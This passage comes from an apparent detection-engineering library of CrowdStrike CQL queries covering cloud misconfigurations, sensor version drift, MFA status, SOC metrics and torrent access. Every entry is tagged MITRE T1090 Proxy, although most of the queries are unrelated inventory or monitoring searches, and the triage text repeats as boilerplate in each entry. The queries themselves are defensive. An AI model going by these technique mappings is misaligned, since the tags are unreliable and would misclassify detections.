| event.action="PutBucketPolicy"
| cloud.Storage.bucket_name =~ in(values=[?BucketName])
| cloud.account.id =~ in(values=[?AwsAccount])
| UserARN := getField("Vendor.userIdentity.arn")
| BucketName := getField("cloud.Storage.bucket_name")
| select(["@timestamp","BucketName", "UserARN"])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: AWS PutBucketPolicy: https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketPolicy.html
* Key Indicators: Review query output fields and filters from `aws_s3_bucket_policy_updates.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Cloud Credential Violation IOMs

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Cloud
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cloud_credential_violation_ioms.yml
> cql_hub_name:: Cloud Credential Violation IOMs
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: CSPM / ASPM / DSPM
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query outputs all identified indicators of misconfigurations (IOMs) related to credentials.
* Telemetry Requirements: Cloud
* Source: CQL Hub (`cloud_credential_violation_ioms.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): CSPM / ASPM / DSPM. Validate that this telemetry/module exists in the environment before operational use.

```cql
CloudService="IAM" | in(field="policy_id", values=["576", "1", "466", "1006", "12", "15", "16", "18", "13", "17", "450", "577", "451", "8"])
| groupBy([PolicyStatement])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `cloud_credential_violation_ioms.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Cloud Data Exfiltration IOMs

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Cloud
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cloud_data_exfiltration_ioms.yml
> cql_hub_name:: Cloud Data Exfiltration IOMs
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: CSPM / ASPM / DSPM
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query outputs all identified indicators of misconfigurations (IOMs) related to data exfiltration.
* Telemetry Requirements: Cloud
* Source: CQL Hub (`cloud_data_exfiltration_ioms.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): CSPM / ASPM / DSPM; Microsoft Azure telemetry; AWS telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
| #repo=base_sensor "event-type" = "cspm_policy_*" vertex_type=ioa

// Translate numerical severity to the severity name
| case {
      policy_severity = 0 | Severity := "Critical"
    ; policy_severity = 1 | Severity := "High"
    ; policy_severity = 2 | Severity := "Medium"
    ; policy_severity = 3 | Severity := "Informational"
    ; *                   | Severity := format("Unknown (%s)", field=policy_severity)
}
| service = Identity
// Format cloud_provider
| case {
      cloud_provider = "aws"   | Provider := "AWS"
    ; cloud_provider = "azure" | Provider := "Azure"
    ; cloud_provider = "gcp"   | Provider := "GCP"
    ; *                        | Provider := upper(cloud_provider)
}

| "Attack types" := concatArray("attack_types", separator="\n")
| "Tactic and technique" := format("%s via %s", field=[mitre_attack_tactic, mitre_attack_technique])

| groupBy(
    [policy_id, Severity, Provider, cloud_service_friendly, policy_statement, policy_description, "Tactic and technique", "Attack types"]
    , limit=max
    , function=[
        count(@timestamp, distinct=true, as=Detections)
        , { max(@timestamp, as="Last detection") | "Last detection" := formatTime("%F %T %Z", field="Last detection")}
    ]
)
| "Attack types" = "Data Exfiltration"
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `cloud_data_exfiltration_ioms.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Cloud Least Privilege IOMs

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Cloud
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cloud_least_privilege_ioms.yml
> cql_hub_name:: Cloud Least Privilege IOMs
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: CSPM / ASPM / DSPM
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query outputs all identified indicators of misconfigurations (IOMs) related to least privilege.
* Telemetry Requirements: Cloud
* Source: CQL Hub (`cloud_least_privilege_ioms.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): CSPM / ASPM / DSPM. Validate that this telemetry/module exists in the environment before operational use.

```cql
CloudService="IAM" | in(field="policy_id", values=["5", "612", "401", "461", "7", "611", "444", "190", "203", "6", "563", "610"])
| groupBy(["policy_statement"])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `cloud_least_privilege_ioms.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Cloud MFA Violation IOMs

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Cloud
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cloud_mfa_violation_ioms.yml
> cql_hub_name:: Cloud MFA Violation IOMs
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: CSPM / ASPM / DSPM
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query outputs all identified indicators of misconfigurations (IOMs) related to MFA violations.
* Telemetry Requirements: Cloud
* Source: CQL Hub (`cloud_mfa_violation_ioms.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): CSPM / ASPM / DSPM. Validate that this telemetry/module exists in the environment before operational use.

```cql
CloudService="IAM" | in(field="policy_id", values=["188", "10", "189", "602", "187", "539"])
| groupBy([PolicyStatement])
| #type != "KGHOST_Gametime"
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `cloud_mfa_violation_ioms.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Falcon Sensor Version Drift Monitoring (Windows)

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: falcon_sensor_version_drift_monitoring.yml
> cql_hub_name:: Falcon Sensor Version Drift Monitoring (Windows)
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1090
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Compares CrowdStrike Falcon sensor major/minor versions (x.xx) over time for each host. The query detects version changes, classifies them as upgrades or downgrades, and outputs the timestamp of the change along with the previous and current version values.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`falcon_sensor_version_drift_monitoring.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
defineTable(query={"#event_simpleName" = OsVersionInfo AgentVersion=*
| groupBy([aid,ComputerName,AgentVersion],function=min("@timestamp"))
}, include=[aid,ComputerName,AgentVersion,_min], name="time")
| defineTable(query={"#event_simpleName" = OsVersionInfo AgentVersion=*
| event_platform=Win
| groupBy([aid,ComputerName],function=[selectFromMin(@timestamp,include=AgentVersion)])
| rename(field=AgentVersion,as=Old_Version)}, include=[aid,ComputerName,Old_Version], name="old")
| "#event_simpleName" = OsVersionInfo AgentVersion=*
| event_platform=Win
| groupBy([aid,ComputerName],function=[selectFromMax(@timestamp,include=[AgentVersion])])
| rename(field=AgentVersion,as=Current_Version)
| match(old, field=[aid])
| match(time, field=[aid,Current_Version],column=[aid,AgentVersion])
| Current_Version=/(?<Short_Current_Version>\d+\.\d+)/
| Old_Version=/(?<Short_Old_Version>\d+\.\d+)/
| if(condition=Current_Version==Old_Version, then="No change", else=if(condition= Short_Current_Version<Short_Old_Version, then="Downgrade", else=if(condition= Short_Current_Version>Short_Old_Version, then="Upgrade", else=0)))
| Status := rename(field="_if")
| "Changed at" := if(condition=Current_Version==Old_Version, then="n/a", else=formatTime(format="%Y/%m/%d %H:%M:%S", field=_min, as="Timestamp"))
| "Old Version" := rename("Old_Version")
| "Current Version" := rename("Current_Version")
| table([ComputerName,aid, "Old Version","Current Version",Status,"Changed at"])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `falcon_sensor_version_drift_monitoring.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Falcon Sensor Version Drift Monitoring (Linux)

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: falcon_sensor_version_drift_monitoring__linux_.yml
> cql_hub_name:: Falcon Sensor Version Drift Monitoring (Linux)
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1090
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Compares CrowdStrike Falcon sensor major/minor versions (x.xx) over time for each host. The query detects version changes, classifies them as upgrades or downgrades, and outputs the timestamp of the change along with the previous and current version values.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`falcon_sensor_version_drift_monitoring__linux_.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; Linux endpoint telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
defineTable(query={"#event_simpleName" = OsVersionInfo AgentVersion=*
| groupBy([aid,ComputerName,AgentVersion],function=min("@timestamp"))
}, include=[aid,ComputerName,AgentVersion,_min], name="time")
| defineTable(query={"#event_simpleName" = OsVersionInfo AgentVersion=*
| event_platform=Lin
| groupBy([aid,ComputerName],function=[selectFromMin(@timestamp,include=AgentVersion)])
| rename(field=AgentVersion,as=Old_Version)}, include=[aid,ComputerName,Old_Version], name="old")
| "#event_simpleName" = OsVersionInfo AgentVersion=*
| event_platform=Lin
| groupBy([aid,ComputerName],function=[selectFromMax(@timestamp,include=[AgentVersion])])
| rename(field=AgentVersion,as=Current_Version)
| match(old, field=[aid])
| match(time, field=[aid,Current_Version],column=[aid,AgentVersion])
| Current_Version=/(?<Short_Current_Version>\d+\.\d+)/
| Old_Version=/(?<Short_Old_Version>\d+\.\d+)/
| if(condition=Current_Version==Old_Version, then="No change", else=if(condition= Short_Current_Version<Short_Old_Version, then="Downgrade", else=if(condition= Short_Current_Version>Short_Old_Version, then="Upgrade", else=0)))
| Status := rename(field="_if")
| "Changed at" := if(condition=Current_Version==Old_Version, then="n/a", else=formatTime(format="%Y/%m/%d %H:%M:%S", field=_min, as="Timestamp"))
| "Old Version" := rename("Old_Version")
| "Current Version" := rename("Current_Version")
| table([ComputerName,aid, "Old Version","Current Version",Status,"Changed at"])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `falcon_sensor_version_drift_monitoring__linux_.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Falcon Sensor Version Drift Monitoring (MacOS)

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: falcon_sensor_version_drift_monitoring__macos_.yml
> cql_hub_name:: Falcon Sensor Version Drift Monitoring (MacOS)
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1090
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Compares CrowdStrike Falcon sensor major/minor versions (x.xx) over time for each host. The query detects version changes, classifies them as upgrades or downgrades, and outputs the timestamp of the change along with the previous and current version values.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`falcon_sensor_version_drift_monitoring__macos_.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; macOS endpoint telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
defineTable(query={"#event_simpleName" = OsVersionInfo AgentVersion=*
| groupBy([aid,ComputerName,AgentVersion],function=min("@timestamp"))
}, include=[aid,ComputerName,AgentVersion,_min], name="time")
| defineTable(query={"#event_simpleName" = OsVersionInfo AgentVersion=*
| event_platform=Mac
| groupBy([aid,ComputerName],function=[selectFromMin(@timestamp,include=AgentVersion)])
| rename(field=AgentVersion,as=Old_Version)}, include=[aid,ComputerName,Old_Version], name="old")
| "#event_simpleName" = OsVersionInfo AgentVersion=*
| event_platform=Mac
| groupBy([aid,ComputerName],function=[selectFromMax(@timestamp,include=[AgentVersion])])
| rename(field=AgentVersion,as=Current_Version)
| match(old, field=[aid])
| match(time, field=[aid,Current_Version],column=[aid,AgentVersion])
| Current_Version=/(?<Short_Current_Version>\d+\.\d+)/
| Old_Version=/(?<Short_Old_Version>\d+\.\d+)/
| if(condition=Current_Version==Old_Version, then="No change", else=if(condition= Short_Current_Version<Short_Old_Version, then="Downgrade", else=if(condition= Short_Current_Version>Short_Old_Version, then="Upgrade", else=0)))
| Status := rename(field="_if")
| "Changed at" := if(condition=Current_Version==Old_Version, then="n/a", else=formatTime(format="%Y/%m/%d %H:%M:%S", field=_min, as="Timestamp"))
| "Old Version" := rename("Old_Version")
| "Current Version" := rename("Current_Version")
| table([ComputerName,aid, "Old Version","Current Version",Status,"Changed at"])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `falcon_sensor_version_drift_monitoring__macos_.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Inspected LDAP / Kerberos / DCE/RCP Traffic

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Identity
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: inspected_ldap___kerberos___dce_rcp_traffic.yml
> cql_hub_name:: Inspected LDAP / Kerberos / DCE/RCP Traffic
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: Identity
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Shows inspected traffic requests over time on the selected domain controller
* Telemetry Requirements: Identity
* Source: CQL Hub (`inspected_ldap___kerberos___dce_rcp_traffic.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Identity. Validate that this telemetry/module exists in the environment before operational use.

```cql
#repo=base_sensor #event_simpleName=/^ActiveDirectory(?:(?!Audit|Account).)*$/i
| aid=?SelectedAid
| case {
  ActiveDirectoryDataProtocol=0 | Protocol:="LDAP";
  ActiveDirectoryDataProtocol=1 | Protocol:="DCE/RPC";
  ActiveDirectoryDataProtocol=2 | Protocol:="SMB";
  ActiveDirectoryAuthenticationMethod=/[1,2,5]/F | Protocol:="NTLM";
  ActiveDirectoryAuthenticationMethod=0 | Protocol:="Kerberos";
}
| timeChart(span=15m, series=Protocol, function=sum("AggregationActivityCount"))
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `inspected_ldap___kerberos___dce_rcp_traffic.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: MFA Status Monitoring

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Identity
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: mfa_status_monitoring.yml
> cql_hub_name:: MFA Status Monitoring
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: Identity
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Displays Multi-Factor Authentication (MFA) status events over time. Monitor for unexpected spikes in denials, errors, or timeouts that may indicate security threats, system issues, or user experience problems requiring investigation.
* Telemetry Requirements: Identity
* Source: CQL Hub (`mfa_status_monitoring.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Identity. Validate that this telemetry/module exists in the environment before operational use.

```cql
#repo=base_sensor #event_simpleName=IdpPolicy*RuleMatch
| in(field=cid, values=[?SelectedCid])
| match(file="aid_master_main.csv", field=[cid, aid])
// Filters
| in(field=MachineDomain, values=[?SelectedDomain])
| case {
  IdpPolicyMfaStatus=1 | IdpPolicyMfaStatus:="Approved";
  IdpPolicyMfaStatus=2 | IdpPolicyMfaStatus:="Denied";
  IdpPolicyMfaStatus=32 | IdpPolicyMfaStatus:="Invalid input";
  IdpPolicyMfaStatus=64 | IdpPolicyMfaStatus:="Resp. timeout";
  IdpPolicyMfaStatus=128 | IdpPolicyMfaStatus:="User not enrolled";
  IdpPolicyMfaStatus=256 | IdpPolicyMfaStatus:="Service Error";
  IdpPolicyMfaStatus=640 | IdpPolicyMfaStatus:="No authorizer";
}
| timeChart(series=IdpPolicyMfaStatus)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `mfa_status_monitoring.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: New installed Sensors

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: new_sensor.yml
> cql_hub_name:: New installed Sensors
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query loads host inventory data from aid_master_main.csv, enriches it with details from aid_master_details.csv, and outputs a cleaned, formatted table of host information.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`new_sensor.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
readFile("aid_master_main.csv")
| FirstSeen > start()
| ProductType match {
    1 => ProductType := "Workstation";
    2 => ProductType := "Domain controller";
    3 => ProductType := "Server";
    * => *;
}
| LastSeen := rename(Time)
| match(file="aid_master_details.csv", field=aid, include=[HostHiddenStatus], strict=false)
| $falcon/investigate:hideHiddenHosts()
| default(field=[ComputerName], value="--", replaceEmpty=true)
| LastSeen_UTC_readable := formatTime(format="%FT%T%z", field=LastSeen)
| FirstSeen_UTC_readable := formatTime(format="%FT%T%z", field=FirstSeen)
| default(field=[LocalAddressIP4, MAC, OU, MachineDomain, SiteName, ProductType, Version, FirstSeen, LastSeen, AgentVersion], value="--", replaceEmpty=true)
| sort(ComputerName, order=asc)
| table([ComputerName, MAC, LocalAddressIP4, AgentVersion, FirstSeen, FirstSeen_UTC_readable, LastSeen, LastSeen_UTC_readable, ProductType, Version, Timezone, MachineDomain, SiteName, OU, aid], limit=20000)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `new_sensor.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Sensor Version Adoption Trend

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: sensor_version_adoption_trend.yml
> cql_hub_name:: Sensor Version Adoption Trend
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1090
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Visualizes the daily distribution of Sensor versions across the environment. It groups versions by Major and Minor releases (e.g., 6.45) to monitor the rollout of updates and identify legacy versions.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`sensor_version_adoption_trend.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=OsVersionInfo 
| AgentVersion=/(?<ShortAgentVersion>\d+\.\d+\.)/
| timeChart(ShortAgentVersion,span="1d")
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `sensor_version_adoption_trend.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: SOC Efficiency Metrics

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: soc_efficiency_metrics.yml
> cql_hub_name:: SOC Efficiency Metrics
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Summarizes CrowdStrike Falcon detections across hosts, showing key lifecycle metrics such as tactic, technique, severity, detection state, and resolution time. Useful for SOC performance tracking, identifying detection patterns, and monitoring time-to-close for incidents.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`soc_efficiency_metrics.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Get events of interest
#repo=detections 
| in(field="ExternalApiType", values=[Event_UserActivityAuditEvent, Event_EppDetectionSummaryEvent])

// Unify detection UUID
| detectID:=Attributes.composite_id | detectID:=CompositeId

// Based on event type, set the timestamp value for later calculations.
| case{
ExternalApiType=Event_UserActivityAuditEvent Attributes.update_status=closed | response_time:=@timestamp;
ExternalApiType=Event_UserActivityAuditEvent Attributes.assign_to_user_id=* | assign_time:=@timestamp;
ExternalApiType=Event_EppDetectionSummaryEvent | detect_time:=@timestamp;
}

// Perform aggregation against detectID to get required values
| groupBy([detectID], function=([count(ExternalApiType, distinct=true), selectLast([Hostname, Attributes.update_status]), max(Severity, as=Severity), collect([Tactic, Technique, FalconHostLink, Attributes.add_tag]), min(detect_time, as=FirstDetect), min(assign_time, as=FirstAssign), min(response_time, as=ResolvedTime)]), limit=200000)

// Check to make sure Hostname value is not null; makes sure there isn't only a detection update event.
| Hostname=*

// This handles when an alert was closed and then reopened
| case{
Attributes.update_status!=closed | ResolvedTime:="";
*;
}

// Calculate durations
| ToAssign:=(FirstAssign-FirstDetect) | ToAssign:=formatDuration(field=ToAssign, precision=3)
| AssignToClose:=(ResolvedTime-FirstAssign) | AssignToClose:=formatDuration(field=AssignToClose, precision=3)
| DetectToClose:=(ResolvedTime-FirstDetect) | DetectToClose:=formatDuration(field=DetectToClose, precision=3)

// Calculate the age of open alerts
| case{
    Attributes.update_status!="closed" | Aging:=now()-FirstDetect | Aging:=formatDuration(Aging, precision=2);
    *;
}

// Set default value for field Attributes.update_status; seeing some null values and not sure why
| default(value="new", field=[Attributes.update_status])
| default(value="-", field=[FirstAssign, ResolvedTime, ToAssign, AssignToClose, DetectToClose, Aging, Tags], replaceEmpty=true)

// Format timestamps out of epoch
| FirstDetect:=formatTime(format="%F %T", field="FirstDetect")
| FirstAssign:=formatTime(format="%F %T", field="FirstAssign")
| ResolvedTime:=formatTime(format="%F %T", field="ResolvedTime")

// Create hyperlink to detection
| format("[Detection Link](%s)", field=[FalconHostLink], as="Detection Link")

// Drop uneeded fields
| drop([detectID, _count, FalconHostLink])

// Rename field with silly name
|rename(field=[[Attributes.update_status, "CurrentState"], ["Attributes.add_tag", Tags]])

// Order output columns to make them pretty
| table([Hostname, Tactic, Technique, Severity, CurrentState, Aging, FirstDetect, FirstAssign, ResolvedTime, ToAssign, AssignToClose, DetectToClose, Tags, "Detection Link"], limit=20000)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `soc_efficiency_metrics.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Torrent Website Access Detected

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Network
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: torrent_website_access_detected.yml
> cql_hub_name:: Torrent Website Access Detected
> cql_hub_author:: Mahfuz
> related_mitre_ids:: T1090
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Detects users successfully accessing peer-to-peer (P2P) or torrent websites through the network where the Palo Alto firewall generated an alert but did not block the traffic.

* Telemetry Requirements: Network
* Source: CQL Hub (`torrent_website_access_detected.yml`), author: Mahfuz.

#### Production-Ready CQL Query:

```cql
#Vendor = paloalto
event.action = url_filtering
| Vendor.Action != "block-url"
| Vendor.Action != "block-url-continue"
| Vendor.Action != "deny"
| (Vendor.URLCategoryList = /peer-to-peer/i OR Vendor.Category = /peer-to-peer/i)
| event.category[1] = threat
| Vendor.ApplicationTechnology = "browser-based"
| "Vendor.application_category" != "general-internet"
| groupBy([url.domain, url.original, source.user.name, source.ip, source.nat.ip, rule.name, Vendor.Action], function=[
    count(as=event_count)
])
| sort(event_count, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `torrent_website_access_detected.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Windows Store Installs

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
